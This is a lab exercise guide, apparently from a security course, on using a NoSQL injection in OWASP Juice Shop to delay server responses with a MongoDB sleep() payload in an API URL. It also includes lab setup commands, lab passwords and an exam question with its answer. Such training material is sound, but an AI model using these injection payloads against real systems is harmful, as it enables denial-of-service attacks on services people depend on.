# Exercise 4 - Exploiting NoSQL Injection for Denial-of-Service (DoS)

## Objective
Learn how a **NoSQL Injection** can be used to trigger a **Denial-of-Service (DoS)** by injecting MongoDB's `sleep()` function into an API request.

---

# What is NoSQL Injection?

NoSQL Injection occurs when an application uses **unsanitized user input** to build NoSQL database queries (e.g., MongoDB).

In this lab, the injected payload is:

```text
sleep(time_in_ms)
```

which makes the database **pause** before returning a response.

Repeated requests can slow down the server and consume resources, leading to a **Denial-of-Service (DoS)**.

---

# Overall Workflow

```text
Start Juice Shop
      │
      ▼
Open Juice Shop
      │
      ▼
Open Developer Tools
      │
      ▼
Inspect Network Traffic
      │
      ▼
Find API Endpoint
      │
      ▼
Identify Injection Point
      │
      ▼
Modify URL
      │
      ▼
Inject sleep()
      │
      ▼
Server Response Delayed
      │
      ▼
NoSQL DoS Confirmed
```

---

# Step 1 - Start Juice Shop (Ubuntu)

Login:

```
Password: toor
```

Stop Apache:

```bash
service apache2 stop
```

Run Juice Shop:

```bash
docker run -d -p 80:3000 bkimminich/juice-shop
```

Start Apache:

```bash
service apache2 start
```

> Ignore any error messages if they appear.

---

# Step 2 - Open Juice Shop (Windows)

Login:

```
Username: Admin
Password: Pa$$w0rd
```

Open a browser and visit:

```
http://192.168.0.19:80
```

Click:

```
Dismiss
```

on the welcome popup.

---

# Step 3 - Find the API Endpoint

Open **Developer Tools**:

```
F12
```

Go to:

```
Network
```

Refresh the page.

Click any product (e.g., **Apple Juice**).

Find the request:

```
/rest/products/1/reviews
```

---

# Step 4 - Test the API

Open:

```
http://192.168.0.19/rest/products/1/reviews
```

The API returns the product reviews.

---

# Step 5 - Inject sleep()

Replace:

```
1
```

with:

```text
sleep(2000)
```

New URL:

```
http://192.168.0.19/rest/products/sleep(2000)/reviews
```

The server waits **2000 ms (2 seconds)** before responding.

This demonstrates a **NoSQL Injection** using MongoDB's `sleep()` function.

---

# Commands Used

Stop Apache:

```bash
service apache2 stop
```

Run Juice Shop:

```bash
docker run -d -p 80:3000 bkimminich/juice-shop
```

Start Apache:

```bash
service apache2 start
```

---

# Important URLs

Juice Shop:

```
http://192.168.0.19:80
```

Original API:

```
http://192.168.0.19/rest/products/1/reviews
```

Injected API:

```
http://192.168.0.19/rest/products/sleep(2000)/reviews
```

---

# Impact

- Slows down database queries.
- Consumes server resources.
- Multiple requests can cause a **Denial-of-Service (DoS)**.

---

# Exam Question

**Q:** Provide the sleep command required to introduce a **200 ms** delay.

**Answer:**

```text
sleep(200)
```

---

# Quick Revision

- **NoSQL Injection** → Unsanitized input executed by a NoSQL database.
- **MongoDB `sleep()`** → Delays query execution.
- Find the API endpoint using **Browser Developer Tools → Network**.
- Replace the product ID with `sleep(time_in_ms)`.
- Delayed response confirms the injection.
- Goal: Demonstrate a **Denial-of-Service (DoS)** attack using NoSQL Injection.
